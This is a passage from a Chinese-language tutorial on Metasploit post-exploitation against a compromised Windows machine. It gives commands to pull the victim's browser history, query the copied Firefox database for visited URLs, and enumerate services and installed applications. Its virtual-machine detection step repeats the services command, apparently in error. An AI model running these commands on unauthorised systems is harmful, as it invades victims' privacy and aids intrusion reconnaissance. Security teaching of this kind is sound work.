二、获取浏览器历史记录

1、通过后渗透模块获取浏览器历史记录

run post/windows/gather/forensics/browser\_history

![](../Images/e997e428189ccc360ccd2c208d63222d.png)

2、打开拷贝到本地的文件

/root/.msf4/local/aiyou\_Firefox\_wqsz7fg5.default-release\_places.sqlite

![](../Images/f7bd3413909afe7aa8eb9b806309774a.png)

![](../Images/34a692b7c0d9a94351b505bcfb3595c0.png)

3、通过执行SQL获取小受浏览过的历史记录

SELECT url FROM moz\_places

![](../Images/2d424c1f8deb8132d4b6f7478feab78c.png)

三、获取开启的服务

run post/windows/gather/enum\_services

![](../Images/66ae805cc089d105ebfad694fd72bd6e.png)

四、检测是否是虚拟机

run post/windows/gather/enum\_services

![](../Images/de2ad7c7e952302ef9a85a261497956f.png)

五、查看安装了哪些应用

run post/windows/gather/enum\_applications

![](../Images/a922544d01dd9016608c9af30696f50d.png)
